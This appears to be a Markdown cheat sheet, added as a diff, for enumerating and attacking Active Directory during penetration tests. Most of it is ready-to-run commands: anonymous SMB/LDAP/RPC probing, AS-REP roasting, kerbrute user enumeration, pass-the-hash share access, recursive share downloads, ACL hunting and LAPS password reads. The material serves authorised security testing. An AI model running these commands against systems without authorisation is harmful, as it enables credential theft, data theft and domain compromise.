@@ -1,0 +1,191 @@
+# Active Directory Enumeration
+
+## Phase 1: Unauthenticated
+
+Try null sessions, anonymous LDAP binds, and Kerberos user enumeration before you have any credentials: these often hand you a foothold.
+
+```bash
+# Port scan for AD services
+nmap -p 88,135,139,389,445,464,636,3268,3269 $DC_IP
+
+# Null session SMB
+nxc smb $IP -u '' -p ''
+nxc smb $IP -u 'guest' -p ''
+smbclient -L //$IP -N            # list shares anonymously
+smbclient //$IP/share -N         # connect to a share anonymously
+
+# RPC null auth
+rpcdump.py $IP
+lookupsid.py anonymous@$IP
+
+# LDAP anonymous bind
+ldapsearch -x -H ldap://$DC_IP -b "DC=$DOMAIN,DC=local"
+
+# AS-REP Roasting without creds
+GetNPUsers.py $DOMAIN/ -dc-ip $IP -no-pass -usersfile users.txt
+
+# User enumeration via Kerberos
+kerbrute userenum -d $DOMAIN --dc $IP ~/tools/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# enum4linux
+enum4linux-ng -A $IP
+```
+
+## Phase 2: Authenticated Enumeration
+
+Once you have creds, enumerate everything before touching exploits.
+
+```bash
+# BloodHound collection (most important)
+bloodhound-python -u $USER -p $PASSWORD -d $DOMAIN -dc $DC_HOST -c all -ns $DC_IP
+nxc ldap $IP -u $USER -p $PASSWORD --bloodhound -c all
+
+# Dump all AD objects to HTML
+ldapdomaindump -u '$DOMAIN\\$USER' -p $PASSWORD $DC_IP
+
+# nxc enumeration
+nxc smb $IP -u $USER -p $PASSWORD --users
+nxc smb $IP -u $USER -p $PASSWORD --groups
+nxc smb $IP -u $USER -p $PASSWORD --shares
+nxc smb $IP -u $USER -p $PASSWORD --pass-pol
+nxc smb $SUBNET -u $USER -p $PASSWORD  # network sweep
+
+# Share spidering
+nxc smb $IP -u $USER -p $PASSWORD -M spider_plus
+```
+
+### SMB Shares (smbclient)
+
+Use smbclient to interactively browse shares and transfer files. More flexible than nxc for actually reading and downloading content.
+
+```bash
+# List shares
+smbclient -L //$IP -U $USER%$PASSWORD
+
+# Connect to a share
+smbclient //$IP/share -U $USER%$PASSWORD
+
+# Pass the hash
+smbclient //$IP/share -U $USER%$HASH --pw-nt-hash
+
+# Non-interactive: run a single command and exit
+smbclient //$IP/share -U $USER%$PASSWORD -c 'ls'
+smbclient //$IP/share -U $USER%$PASSWORD -c 'get file.txt'
+
+# Recursive download of entire share
+smbclient //$IP/share -U $USER%$PASSWORD -c 'recurse; prompt; mget *'
+```
+
+Inside an smbclient session:
+
+```
+ls                   # list current directory
+cd path              # change directory
+get file.txt         # download a single file
+put local.txt        # upload a file
+recurse on           # enable recursive listing and transfers
+prompt off           # disable confirmation for mget/mput
+mget *               # download everything (run recurse on; prompt off first)
+```
+
+### BloodHound Key Queries
+- Shortest Path to Domain Admins
+- Find Principals with DCSync Rights
+- Find Kerberoastable Users
+- Find AS-REP Roastable Users
+- Computers Where Domain Users are Local Admin
+- Find Principals with Dangerous Rights (WriteDacl, GenericAll, GenericWrite, Owns)
+
+> ⚠️ BloodHound misses granular ACL misconfigs. Always follow up with PowerView and bloodyAD.
+
+## Phase 3: ACL Enumeration
+
+BloodHound won't catch everything: sweep with PowerView and bloodyAD to find writable attributes and dangerous ACEs that the graph misses.
+
+```powershell
+# PowerView: import first
+Import-Module .\PowerView.ps1
+
+# Find all interesting ACLs for your user
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
+    $_.IdentityReferenceName -match "your.user"
+}
+
+# Check ACLs on specific object
+Get-ObjectAcl -DistinguishedName "OU=Staff,DC=domain,DC=local" -ResolveGUIDs
+
+# Find GenericAll/GenericWrite on any object
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
+    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"
+}
+
+# Find DCSync rights
+Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | Where-Object {
+    $_.ObjectAceType -match "DS-Replication"
+}
+```
+
+```bash
+# bloodyAD from Linux
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype ALL
+bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST get writable --otype USER
+```
+
+## Phase 4: Additional Checks
+
+Check delegation, LAPS, gMSA, and dMSA: these are often overlooked and frequently exploitable.
+
+```powershell
+# Domain info
+Get-Domain
+Get-DomainController
+Get-DomainPolicy
+
+# Delegation
+Get-DomainComputer -Unconstrained
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+
+# RBCD
+Get-DomainComputer | Where-Object {$_.'msds-allowedtoactonbehalfofotheridentity' -ne $null}
+
+# LAPS
+Get-DomainComputer | Select-Object name, ms-mcs-admpwd
+
+# gMSA
+Get-DomainObject -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)"
+
+# dMSA (Windows Server 2025)
+Get-DomainObject -LDAPFilter "(objectClass=msDS-DelegatedManagedServiceAccount)"
+```
+
+## Enumeration Checklist
+
+- [ ] Null session SMB/LDAP/RPC
+- [ ] AS-REP Roasting without creds
+- [ ] User enumeration via kerbrute
+- [ ] BloodHound full collection
+- [ ] ldapdomaindump
+- [ ] PowerView ACL sweep
+- [ ] bloodyAD writable objects
+- [ ] Kerberoasting
+- [ ] Share enumeration + spidering
+- [ ] Unconstrained delegation
+- [ ] Constrained delegation
+- [ ] RBCD
+- [ ] Shadow Credentials (msDS-KeyCredentialLink writable?)
+- [ ] LAPS
+- [ ] gMSA
+- [ ] dMSA / BadSuccessor (WS2025)
+- [ ] DCSync rights
+- [ ] Local admin access on any machine?
+- [ ] Trust relationships?
+
+## Time Sync (Always Before Kerberos)
+
+Kerberos requires clock skew within 5 minutes of the DC: sync time before any Kerberos-based attack or you'll get `KRB_AP_ERR_SKEW`.
+
+```bash
+sudo timedatectl set-ntp false
+sudo date -s "$(curl -s -I http://$DC_IP | grep -i '^Date:' | cut -d' ' -f2-)"
+```
